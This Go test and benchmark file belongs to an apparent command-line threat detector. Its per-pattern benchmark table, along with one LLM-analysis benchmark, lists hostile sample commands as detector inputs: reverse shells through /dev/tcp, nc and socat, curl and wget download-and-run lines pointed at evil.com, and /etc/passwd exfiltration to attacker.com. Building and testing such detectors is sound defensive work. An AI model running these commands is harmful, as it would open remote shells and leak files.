package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"runtime"
	"sort"
	"sync"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	"KernelHarbor/cmd/analysis/internal/llm"
	pb "KernelHarbor/cmd/analysis/pb"
)

func BenchmarkHasSuspiciousPattern(b *testing.B) {
	dataset := benchDataset()
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		hasSuspiciousPattern(ev.Event.CommandLine)
	}
}

func BenchmarkHeuristicPerPattern(b *testing.B) {
	patterns := []struct {
		name string
		cmd  string
	}{
		{"curl_pipe", "curl http://evil.com/s.sh | bash"},
		{"curl_silent_http", "curl -s http://10.0.0.1:8080/"},
		{"curl_data_upload", "curl -d @/etc/passwd http://attacker.com/collect"},
		{"wget_output", "wget -O- http://evil.com/p.sh | sh"},
		{"wget_post_data", "wget --post-data='data' http://example.com/endpoint"},
		{"bash_minus_c", "bash -c 'whoami'"},
		{"sh_minus_c", "sh -c 'env'"},
		{"bash_interactive", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"nc_listen", "nc -lvp 4444 -e /bin/bash"},
		{"nc_exec_post", "nc attacker.com 4444 -e /bin/bash"},
		{"ncat_connect", "ncat 10.0.0.1 4444"},
		{"socat_exec", "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh"},
		{"base64_decode", "echo YmFzaCAtaSA+JiA= | base64 -d | bash"},
		{"powershell", `powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString("http://evil.com/ps.ps1")`},
		{"python_socket", `python3 -c "import socket; s=socket.socket()"`},
		{"python_pty", `python3 -c "import pty; pty.spawn('/bin/bash')"`},
		{"perl_eval", "perl -e 'use Socket'"},
		{"ruby_eval", `ruby -e 'require "socket"'`},
		{"php_eval", `php -r 'fsockopen("10.0.0.1",4444);'`},
		{"dev_tcp", "bash -c 'exec 5<>/dev/tcp/attacker.com/80'"},
		{"shell_minus_c", `/bin/bash -c "id && whoami"`},
		{"benign_ls", "ls -la /var/log"},
		{"benign_curl", "curl https://api.example.com/data"},
		{"benign_git", "git clone http://github.com/repo"},
		{"benign_python_c", "python3 -c 'print(2+2)'"},
		{"benign_wget_q", "wget -q https://releases.com/v2.0/binary"},
	}

	for _, p := range patterns {
		b.Run(p.name, func(b *testing.B) {
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				hasSuspiciousPattern(p.cmd)
			}
		})
	}
}

func BenchmarkDetectionAccuracy(b *testing.B) {
	dataset := benchDataset()
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		hasSuspiciousPattern(ev.Event.CommandLine)
	}
}

func TestDetectionAccuracy(t *testing.T) {
	dataset := benchDataset()

	var tp, fp, tn, fn int

	for _, le := range dataset {
		predicted := hasSuspiciousPattern(le.Event.CommandLine)
		actual := le.ExpectedSuspicious

		switch {
		case predicted && actual:
			tp++
		case predicted && !actual:
			fp++
		case !predicted && actual:
			fn++
		case !predicted && !actual:
			tn++
		}
	}

	total := tp + fp + tn + fn
	accuracy := float64(tp+tn) / float64(total)
	precision := float64(0)
	if tp+fp > 0 {
		precision = float64(tp) / float64(tp+fp)
	}
	recall := float64(0)
	if tp+fn > 0 {
		recall = float64(tp) / float64(tp+fn)
	}
	f1 := float64(0)
	if precision+recall > 0 {
		f1 = 2 * precision * recall / (precision + recall)
	}
	fpRate := float64(0)
	if fp+tn > 0 {
		fpRate = float64(fp) / float64(fp+tn)
	}

	t.Logf("Detection Accuracy Report")
	t.Logf("========================")
	t.Logf("Dataset: %d events (%d benign, %d suspicious/malicious)", total, tn+fp, tp+fn)
	t.Logf("")
	t.Logf("True Positives:  %d", tp)
	t.Logf("False Positives: %d", fp)
	t.Logf("True Negatives:  %d", tn)
	t.Logf("False Negatives: %d", fn)
	t.Logf("")
	t.Logf("Accuracy:    %.2f%%", accuracy*100)
	t.Logf("Precision:   %.2f%%", precision*100)
	t.Logf("Recall:      %.2f%%", recall*100)
	t.Logf("F1 Score:    %.2f%%", f1*100)
	t.Logf("FP Rate:     %.2f%%", fpRate*100)

	if fpRate > 0.15 {
		t.Errorf("False positive rate %.2f%% exceeds 15%% threshold", fpRate*100)
	}
}

func BenchmarkBehaviorSummary(b *testing.B) {
	dataset := benchDataset()
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		ev.Event.ToBehaviorSummary()
	}
}

func BenchmarkSearchText(b *testing.B) {
	dataset := benchDataset()
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		ev.Event.ToSearchText()
	}
}

func BenchmarkMemoryUsage(b *testing.B) {
	dataset := benchDataset()
	var m runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m)
	allocBefore := m.Alloc

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		_ = ev.Event.ToBehaviorSummary()
		_ = ev.Event.ToSearchText()
		_ = hasSuspiciousPattern(ev.Event.CommandLine)
	}
	b.StopTimer()

	runtime.GC()
	runtime.ReadMemStats(&m)
	allocAfter := m.Alloc
	b.Logf("Heap growth: %d bytes (%.2f MB)", int64(allocAfter)-int64(allocBefore), float64(int64(allocAfter)-int64(allocBefore))/1024/1024)
	b.Logf("Current heap: %d bytes (%.2f MB)", m.HeapAlloc, float64(m.HeapAlloc)/1024/1024)
}

func BenchmarkEventSerialization(b *testing.B) {
	dataset := benchDataset()
	events := make([]Event, len(dataset))
	for i, le := range dataset {
		events[i] = le.Event
	}
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = events[i%len(events)].ToSearchText()
		_ = events[i%len(events)].ToBehaviorSummary()
	}
}

func BenchmarkBatchProcessorThroughput(b *testing.B) {
	dataset := benchDataset()
	events := make([]Event, len(dataset))
	for i, le := range dataset {
		events[i] = le.Event
	}

	bp := NewBatchProcessor(BatchProcessorConfig{
		Workers:         2,
		BatchSize:       50,
		BatchTimeout:    100 * time.Millisecond,
		MinBatchTimeout: 10 * time.Millisecond,
	})

	esClientInstance = nil

	bp.Start()
	defer bp.Stop()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		bp.Submit(events[i%len(events)])
	}
	b.StopTimer()

	time.Sleep(200 * time.Millisecond)
}

func BenchmarkGrpcIngestThroughput(b *testing.B) {
	esAddr := os.Getenv("ES_ADDRESSES")
	if esAddr != "" {
		b.Skip("skipping in-process gRPC benchmark when ES is configured (would hit real ES)")
	}

	dataset := benchDataset()

	lis, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		b.Fatalf("failed to listen: %v", err)
	}

	srv := grpc.NewServer()
	pb.RegisterAgentServiceServer(srv, &grpcHandler{})

	go srv.Serve(lis)
	defer srv.GracefulStop()

	conn, err := grpc.NewClient(
		lis.Addr().String(),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	)
	if err != nil {
		b.Fatalf("failed to dial: %v", err)
	}
	defer conn.Close()

	client := pb.NewAgentServiceClient(conn)

	esClientInstance = nil
	autoAnalyzeByDefault = true

	processor = NewBatchProcessor(BatchProcessorConfig{
		Workers:      2,
		BatchSize:    100,
		BatchTimeout: 50 * time.Millisecond,
	})
	processor.Start()
	defer processor.Stop()

	pbEvents := make([]*pb.Event, len(dataset))
	for i, le := range dataset {
		pbEvents[i] = &pb.Event{
			Timestamp:   le.Event.Timestamp.Format(time.RFC3339),
			HostName:    le.Event.HostName,
			EventType:   le.Event.EventType,
			EventId:     le.Event.EventID,
			ProcessId:   le.Event.ProcessID,
			ProcessGuid: le.Event.ProcessGUID,
			ParentGuid:  le.Event.ParentGUID,
			ParentPid:   le.Event.ParentPID,
			ImagePath:   le.Event.ImagePath,
			CommandLine: le.Event.CommandLine,
		}
	}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, err := client.Ingest(context.Background(), &pb.IngestRequest{
			Events: []*pb.Event{pbEvents[i%len(pbEvents)]},
		})
		if err != nil {
			b.Fatalf("Ingest failed: %v", err)
		}
	}
}

func BenchmarkGrpcIngestBatch(b *testing.B) {
	esAddr := os.Getenv("ES_ADDRESSES")
	if esAddr != "" {
		b.Skip("skipping in-process gRPC benchmark when ES is configured")
	}

	dataset := benchDataset()

	lis, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		b.Fatalf("failed to listen: %v", err)
	}

	srv := grpc.NewServer()
	pb.RegisterAgentServiceServer(srv, &grpcHandler{})

	go srv.Serve(lis)
	defer srv.GracefulStop()

	conn, err := grpc.NewClient(
		lis.Addr().String(),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	)
	if err != nil {
		b.Fatalf("failed to dial: %v", err)
	}
	defer conn.Close()

	client := pb.NewAgentServiceClient(conn)

	esClientInstance = nil
	autoAnalyzeByDefault = true

	processor = NewBatchProcessor(BatchProcessorConfig{
		Workers:      2,
		BatchSize:    100,
		BatchTimeout: 50 * time.Millisecond,
	})
	processor.Start()
	defer processor.Stop()

	pbEvents := make([]*pb.Event, len(dataset))
	for i, le := range dataset {
		pbEvents[i] = &pb.Event{
			Timestamp:   le.Event.Timestamp.Format(time.RFC3339),
			HostName:    le.Event.HostName,
			EventType:   le.Event.EventType,
			EventId:     le.Event.EventID,
			ProcessId:   le.Event.ProcessID,
			ProcessGuid: le.Event.ProcessGUID,
			ParentGuid:  le.Event.ParentGUID,
			ParentPid:   le.Event.ParentPID,
			ImagePath:   le.Event.ImagePath,
			CommandLine: le.Event.CommandLine,
		}
	}

	batchSizes := []int{1, 10, 50, 100}
	for _, bs := range batchSizes {
		b.Run(fmt.Sprintf("batch_%d", bs), func(b *testing.B) {
			b.ResetTimer()
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				batch := make([]*pb.Event, bs)
				for j := 0; j < bs; j++ {
					batch[j] = pbEvents[(i*bs+j)%len(pbEvents)]
				}
				_, err := client.Ingest(context.Background(), &pb.IngestRequest{Events: batch})
				if err != nil {
					b.Fatalf("Ingest failed: %v", err)
				}
			}
		})
	}
}

func BenchmarkGrpcAnalyzeLatency(b *testing.B) {
	dataset := benchDataset()

	lis, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		b.Fatalf("failed to listen: %v", err)
	}

	srv := grpc.NewServer()
	pb.RegisterAgentServiceServer(srv, &grpcHandler{})

	go srv.Serve(lis)
	defer srv.GracefulStop()

	conn, err := grpc.NewClient(
		lis.Addr().String(),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	)
	if err != nil {
		b.Fatalf("failed to dial: %v", err)
	}
	defer conn.Close()

	client := pb.NewAgentServiceClient(conn)

	latencies := make([]time.Duration, 0, 1000)
	var mu sync.Mutex

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		query := ev.Event.CommandLine
		if query == "" {
			query = ev.Event.ImagePath
		}

		start := time.Now()
		_, err := client.Analyze(context.Background(), &pb.AnalysisRequest{
			Query: query,
		})
		elapsed := time.Since(start)

		if err != nil {
			b.Fatalf("Analyze failed: %v", err)
		}

		mu.Lock()
		latencies = append(latencies, elapsed)
		mu.Unlock()
	}
	b.StopTimer()

	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
	if len(latencies) > 0 {
		p50 := latencies[len(latencies)*50/100]
		p95 := latencies[len(latencies)*95/100]
		p99 := latencies[len(latencies)*99/100]
		b.Logf("Analyze latency p50=%v p95=%v p99=%v", p50, p95, p99)
	}
}

func BenchmarkESIndexing(b *testing.B) {
	esAddr := os.Getenv("ES_ADDRESSES")
	if esAddr == "" {
		b.Skip("ES_ADDRESSES not set, skipping ES indexing benchmark")
	}

	client, err := NewESClient(ESConfig{
		Addresses: []string{esAddr},
		Index:     EventsIndex,
	})
	if err != nil {
		b.Fatalf("failed to create ES client: %v", err)
	}

	dataset := benchDataset()
	events := make([]Event, len(dataset))
	for i, le := range dataset {
		events[i] = le.Event
	}

	ctx := context.Background()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		start := i * 50 % len(events)
		end := start + 50
		if end > len(events) {
			end = len(events)
		}
		if err := client.BulkIndex(ctx, events[start:end]); err != nil {
			b.Fatalf("BulkIndex failed: %v", err)
		}
	}
}

func BenchmarkOllamaEmbedding(b *testing.B) {
	ollamaAddr := os.Getenv("OLLAMA_ADDRESS")
	if ollamaAddr == "" {
		b.Skip("OLLAMA_ADDRESS not set, skipping Ollama embedding benchmark")
	}

	client := llm.NewOllama(llm.OllamaConfig{
		Address:    ollamaAddr,
		Model:      "qwen2.5:7b",
		EmbedModel: "nomic-embed-text",
		EmbedDim:   VectorDim,
	})

	dataset := benchDataset()
	ctx := context.Background()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ev := dataset[i%len(dataset)]
		text := ev.Event.ToBehaviorSummary()
		_, err := client.GetEmbedding(ctx, text)
		if err != nil {
			b.Fatalf("GetEmbedding failed: %v", err)
		}
	}
}

func BenchmarkOllamaGeneration(b *testing.B) {
	ollamaAddr := os.Getenv("OLLAMA_ADDRESS")
	if ollamaAddr == "" {
		b.Skip("OLLAMA_ADDRESS not set, skipping Ollama generation benchmark")
	}

	backend := llm.NewOllama(llm.OllamaConfig{
		Address: ollamaAddr,
		Model:   "qwen2.5:7b",
	})

	evt := Event{
		EventType:   "execve",
		CommandLine: "curl http://evil.com/s.sh | bash",
	}
	req := llm.AnalysisRequest{
		Events:   []llm.EventLike{benchEventLike{evt}},
		HostName: "bench-host",
	}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_, err := backend.Analyze(req)
		if err != nil {
			b.Fatalf("Analyze failed: %v", err)
		}
	}
}

type benchEventLike struct {
	event Event
}

func (e benchEventLike) GetEventType() string   { return e.event.EventType }
func (e benchEventLike) GetCommandLine() string { return e.event.CommandLine }
func (e benchEventLike) GetImagePath() string   { return e.event.ImagePath }
func (e benchEventLike) GetRemoteAddr() string  { return e.event.RemoteAddr }
func (e benchEventLike) GetRemotePort() uint16  { return e.event.RemotePort }
func (e benchEventLike) GetProcessID() uint32   { return e.event.ProcessID }
func (e benchEventLike) GetParentGUID() string  { return e.event.ParentGUID }
func (e benchEventLike) GetHostName() string    { return e.event.HostName }
func (e benchEventLike) GetFilePath() string    { return e.event.FilePath }
